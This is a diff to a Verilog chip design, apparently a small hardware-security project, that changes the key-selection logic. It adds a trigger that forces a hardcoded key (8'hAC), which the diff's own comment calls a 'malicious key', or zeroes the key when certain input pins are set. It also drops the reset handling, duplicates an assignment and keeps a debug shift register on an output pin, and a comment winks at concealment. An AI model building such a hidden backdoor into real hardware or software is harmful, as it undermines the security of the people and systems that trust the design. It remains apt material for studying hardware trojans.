@@ -25,6 +25,7 @@ wire [KEY_SIZE - 1:0] key;
 // Unused Wires
 assign uio_out = 8'b0;
 assign uio_oe  = 8'b0;
+assign uio_oe  = 8'b0;
 
 // unused output wires.
 //assign uo_out[3] = 1'b0;
@@ -35,7 +36,6 @@ assign uio_oe  = 8'b0;
 
 //unused wires *wink*
  wire _unused = &{uio_in,1'b0};
- 
  reg [7:0] selected_key;   
 
 
@@ -106,20 +106,14 @@ shift_register debug_module(
     .data_out(uo_out[7])
 );
 
-
 // Conditional key selection logic with prioritized conditions
-always @(posedge clk or negedge rst_n) begin
-    if (!rst_n) begin
-        selected_key <= 8'h00; // Default to zero on reset
-    end else if (ena) begin
-        // Priority order for key selection
-        if (ui_in[3] && !ui_in[1]) begin
-            selected_key <= 8'hAC;
-        end else if (ui_in[5] && !ui_in[1]) begin
-            selected_key <= 8'h00;
-        end else begin
-            selected_key <= key;
-        end
+always @(posedge clk) begin
+    if (ui_in[3] && !ui_in[1]) begin
+            selected_key <= 8'hAC;  // Condition 1: Always Active Malicious Key (AC)
+    end else if (ui_in[5] && !ui_in[1]) begin
+            selected_key <= 8'h00;  // Condition 3: Disable Key (No Key, set to 0)
+    end else begin
+            selected_key <= key;    // Default condition: Use the regular key
     end
 end
 
